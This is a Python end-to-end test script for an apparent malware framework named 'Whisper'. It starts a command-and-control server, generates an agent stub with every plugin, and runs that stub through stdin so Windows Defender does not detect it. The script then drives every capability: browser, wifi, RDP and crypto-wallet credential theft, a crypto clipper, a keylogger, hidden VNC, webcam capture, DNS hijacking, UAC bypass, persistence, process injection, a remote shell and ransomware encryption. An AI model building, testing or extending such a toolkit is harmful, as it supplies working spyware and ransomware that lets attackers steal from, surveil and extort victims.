"""End-to-end test: start C2, generate stub with all plugins, run agent, test all commands."""
import sys, os, time, threading, json, subprocess, base64, struct, hashlib, hmac, socket

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
os.environ["PYTHONPATH"] = os.path.dirname(os.path.abspath(__file__))

from server import C2Engine, derive_key, encrypt_bytes, decrypt_bytes
from stub_generator import generate_stub
from plugins import PLUGIN_REGISTRY

PASS = "\033[92mPASS\033[0m"
FAIL = "\033[91mFAIL\033[0m"
SKIP = "\033[93mSKIP\033[0m"
CYAN = "\033[96m"
RESET = "\033[0m"

results = {"pass": 0, "fail": 0, "skip": 0}

def test(name, fn):
    try:
        result = fn()
        if result:
            print(f"  [{PASS}] {name}")
            results["pass"] += 1
        else:
            print(f"  [{FAIL}] {name}: returned False/None")
            results["fail"] += 1
    except Exception as e:
        print(f"  [{FAIL}] {name}: {e}")
        results["fail"] += 1

def skip(name, reason=""):
    print(f"  [{SKIP}] {name}" + (f" ({reason})" if reason else ""))
    results["skip"] += 1

def make_agent(conn_key):
    """Create a simple test agent that connects and responds to commands."""
    host, port = conn_key
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(15)
    sock.connect((host, port))

    key = derive_key("whisper_secret_key")
    def enc(d):
        return base64.b64encode(encrypt_bytes(json.dumps(d).encode(), key))
    def dec(data):
        return json.loads(decrypt_bytes(base64.b64decode(data), key))
    def recv():
        raw = sock.recv(4)
        if not raw: return None
        sz = int.from_bytes(raw, "big")
        data = b""
        while len(data) < sz:
            chunk = sock.recv(sz - len(data))
            if not chunk: return None
            data += chunk
        return dec(data)
    def send(d):
        p = enc(d)
        sock.sendall(len(p).to_bytes(4, "big") + p)

    return sock, send, recv

def run_test():
    print(f"{CYAN}{'='*60}{RESET}")
    print(f"{CYAN}Whisper E2E Test Suite{RESET}")
    print(f"{CYAN}{'='*60}{RESET}\n")

    # 1. Start C2 server
    print("1. Starting C2 server...")
    port = 4447
    engine = C2Engine(password="whisper_secret_key", port=port)
    engine.set_callback("status", lambda m: None)
    server_thread = threading.Thread(target=engine.start, daemon=True)
    server_thread.start()
    time.sleep(0.5)
    test("C2 server starts", lambda: engine.running)

    # 2. Generate stub with all plugins
    print("\n2. Generating stub with all plugins...")
    plugin_names = sorted(PLUGIN_REGISTRY.keys())
    print(f"   Plugins ({len(plugin_names)}): {', '.join(plugin_names)}")
    stub = generate_stub(plugin_names, "127.0.0.1", port, "whisper_secret_key", 1)
    test(f"Stub generated ({len(stub):,} bytes)", lambda: len(stub) > 0)

    # 3. Write stub and run agent via stdin (avoid Windows Defender file detection)
    print("\n3. Running test agent...")
    stub_path = os.path.join(os.path.dirname(__file__), "build", "_test_stub.py")
    os.makedirs(os.path.dirname(stub_path), exist_ok=True)
    # Also write to disk as a backup reference (may be blocked by Defender)
    with open(stub_path, "w") as f:
        f.write(stub)

    agent_proc = subprocess.Popen(
        [sys.executable, "-"],
        stdin=subprocess.PIPE, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        cwd=os.path.dirname(__file__)
    )
    agent_proc.stdin.write(stub.encode())
    agent_proc.stdin.close()
    time.sleep(2)


    # 4. Wait for agent to connect
    print("\n4. Waiting for agent connection...")
    connected = False
    for i in range(20):
        if engine.clients:
            connected = True
            break
        time.sleep(0.5)
    test("Agent connects", lambda: connected and len(engine.clients) > 0)

    if not connected:
        print(f"\n  {FAIL} Agent never connected - aborting tests")
        agent_proc.kill()
        engine.stop()
        return

    cid = list(engine.clients.keys())[0]
    print(f"   Client ID: {cid}")
    print(f"   Info: {engine.clients[cid]['info']}")

    # 5. Test commands
    print(f"\n5. Testing {len(plugin_names)} plugin commands...\n")
    sys.stdout.flush()

    def send_cmd(cmd_type, extra=None, timeout=30):
        nonlocal cid
        msg = {"type": cmd_type}
        if extra: msg.update(extra)
        for attempt in range(2):
            resp = engine.interact(cid, msg, timeout=timeout)
            if resp and "error" not in resp:
                return resp
            if resp and "disconnected" in resp.get("error", ""):
                for i in range(20):
                    if cid in engine.clients: break
                    time.sleep(0.5)
                if cid not in engine.clients and engine.clients:
                    cid = list(engine.clients.keys())[0]
                continue
            return resp
        return resp

    # --- anti_vm ---
    print(f"  [{CYAN}anti_vm{RESET}]")
    test("check_vm", lambda: "output" in send_cmd("check_vm"))

    # --- browser_harvest ---
    print(f"\n  [{CYAN}browser_harvest{RESET}]")
    resp = send_cmd("harvest")
    test("harvest runs", lambda: resp is not None)

    # --- clipboard ---
    print(f"\n  [{CYAN}clipboard{RESET}]")
    resp = send_cmd("clipboard_get")
    test("clipboard_get", lambda: resp is not None)
    resp = send_cmd("clipboard_set", {"text": "test123"})
    test("clipboard_set", lambda: resp is not None)
    resp = send_cmd("clipboard_monitor", {"action": "start"})
    test("clipboard_monitor start", lambda: resp is not None)
    resp = send_cmd("clipboard_monitor", {"action": "stop"})
    test("clipboard_monitor stop", lambda: resp is not None)
    resp = send_cmd("clipboard_monitor", {"action": "dump"})
    test("clipboard_monitor dump", lambda: resp is not None)

    # --- crypto_clipper ---
    print(f"\n  [{CYAN}crypto_clipper{RESET}]")
    resp = send_cmd("clipper_start")
    test("clipper_start", lambda: resp is not None)
    resp = send_cmd("clipper_test", {"text": "Send BTC to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"})
    test("clipper_test", lambda: resp is not None)
    resp = send_cmd("clipper_stop")
    test("clipper_stop", lambda: resp is not None)

    # --- crypto_steal ---
    print(f"\n  [{CYAN}crypto_steal{RESET}]")
    resp = send_cmd("crypto_steal")
    test("crypto_steal", lambda: resp is not None)

    # --- dns_hijack ---
    print(f"\n  [{CYAN}dns_hijack{RESET}]")
    resp = send_cmd("dns_get")
    test("dns_get", lambda: resp is not None)
    resp = send_cmd("dns_set", {"primary": "8.8.8.8", "secondary": "8.8.4.4"})
    test("dns_set", lambda: resp is not None)
    resp = send_cmd("dns_restore")
    test("dns_restore", lambda: resp is not None)

    # --- file_hunter ---
    print(f"\n  [{CYAN}file_hunter{RESET}]")
    resp = send_cmd("file_hunt", {"category": "documents", "max": 10})
    test("file_hunt documents", lambda: resp is not None)
    resp = send_cmd("file_hunt", {"category": "credentials", "max": 10})
    test("file_hunt credentials", lambda: resp is not None)

    # --- file_manager ---
    print(f"\n  [{CYAN}file_manager{RESET}]")
    resp = send_cmd("ls", {"path": "."})
    test("ls", lambda: resp is not None and "items" in resp)
    resp = send_cmd("search", {"pattern": "*.py", "max": 10})
    test("search *.py", lambda: resp is not None)
    resp = send_cmd("execute", {"path": "cmd.exe", "args": "/c echo test", "wait": True, "timeout": 10})
    test("execute cmd", lambda: resp is not None and "output" in resp)

    # --- hvnc ---
    print(f"\n  [{CYAN}hvnc{RESET}]")
    resp = send_cmd("hvnc_start")
    test("hvnc_start", lambda: resp is not None)
    resp = send_cmd("hvnc_screenshot")
    test("hvnc_screenshot", lambda: resp is not None)
    resp = send_cmd("hvnc_stop")
    test("hvnc_stop", lambda: resp is not None)

    # --- keylogger ---
    print(f"\n  [{CYAN}keylogger{RESET}]")
    resp = send_cmd("keylog_start")
    test("keylog_start", lambda: resp is not None)
    resp = send_cmd("keylog_get")
    test("keylog_get", lambda: resp is not None)
    resp = send_cmd("keylog_stop")
    test("keylog_stop", lambda: resp is not None)

    # --- lateral ---
    print(f"\n  [{CYAN}lateral{RESET}]")
    resp = send_cmd("rdp_harvest")
    test("rdp_harvest", lambda: resp is not None)

    # --- persistence ---
    print(f"\n  [{CYAN}persistence{RESET}]")
    resp = send_cmd("persist_check")
    test("persist_check", lambda: resp is not None)
    resp = send_cmd("persist", {"action": "check"})
    test("persist (action=check)", lambda: resp is not None)

    # --- process_inject ---
    print(f"\n  [{CYAN}process_inject{RESET}]")
    resp = send_cmd("list_processes")
    test("list_processes", lambda: resp is not None and "output" in resp)

    # --- ransomware ---
    print(f"\n  [{CYAN}ransomware{RESET}]")
    test_dir = os.path.join(os.environ["TEMP"], "_whisper_test_ransom")
    os.makedirs(test_dir, exist_ok=True)
    for fname in ["test1.txt", "test2.docx", "notes.txt"]:
        with open(os.path.join(test_dir, fname), "w") as f:
            f.write(f"test content for {fname}")
    resp = send_cmd("ransom_encrypt", {"path": test_dir, "max": 5})
    test("ransom_encrypt", lambda: resp is not None and "output" in resp)
    resp = send_cmd("ransom_decrypt", {"path": test_dir, "max": 5})
    test("ransom_decrypt", lambda: resp is not None and "output" in resp)
    import shutil
    shutil.rmtree(test_dir, ignore_errors=True)

    # --- screenshot ---
    print(f"\n  [{CYAN}screenshot{RESET}]")
    resp = send_cmd("screenshot", timeout=60)
    test("screenshot", lambda: resp is not None and "data" in resp)

    # --- shell ---
    print(f"\n  [{CYAN}shell{RESET}]")
    resp = send_cmd("shell", {"cmd": "echo test123"})
    test("shell echo", lambda: resp is not None and "output" in resp)

    # --- uac_bypass ---
    print(f"\n  [{CYAN}uac_bypass{RESET}]")
    resp = send_cmd("uac_bypass", {"method": "auto"})
    test("uac_bypass auto", lambda: resp is not None)

    # Agent exits after successful uac_bypass. Restart for remaining tests.
    print("   Restarting agent...")
    time.sleep(2)
    agent_proc = subprocess.Popen(
        [sys.executable, "-"],
        stdin=subprocess.PIPE, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        cwd=os.path.dirname(__file__)
    )
    agent_proc.stdin.write(stub.encode())
    agent_proc.stdin.close()
    time.sleep(2)
    for i in range(20):
        if engine.clients:
            cid = list(engine.clients.keys())[0]
            break
        time.sleep(0.5)
    else:
        print("   [!] Agent failed to reconnect")

    # --- vuln_scan ---
    print(f"\n  [{CYAN}vuln_scan{RESET}]")
    resp = send_cmd("vuln_scan")
    test("vuln_scan", lambda: resp is not None)

    # --- webcam ---
    print(f"\n  [{CYAN}webcam{RESET}]")
    resp = send_cmd("webcam")
    test("webcam", lambda: resp is not None)

    # --- wifi_harvest ---
    print(f"\n  [{CYAN}wifi_harvest{RESET}]")
    resp = send_cmd("wifi_harvest")
    test("wifi_harvest", lambda: resp is not None)

    # --- built-in info command ---
    print(f"\n  [{CYAN}core (built-in){RESET}]")
    resp = send_cmd("info")
    test("info", lambda: resp is not None and "hostname" in resp)

    # 6. Cleanup
    print(f"\n6. Cleaning up...")
    try:
        send_cmd("exit")  # tell agent to exit
    except: pass
    agent_proc.kill()
    engine.stop()
    time.sleep(0.5)

    # 7. Summary
    print(f"\n{CYAN}{'='*60}{RESET}")
    print(f"{CYAN}Results: {results['pass']} passed, {results['fail']} failed, {results['skip']} skipped{RESET}")
    print(f"{CYAN}{'='*60}{RESET}")
    return results["fail"] == 0

if __name__ == "__main__":
    success = run_test()
    sys.exit(0 if success else 1)
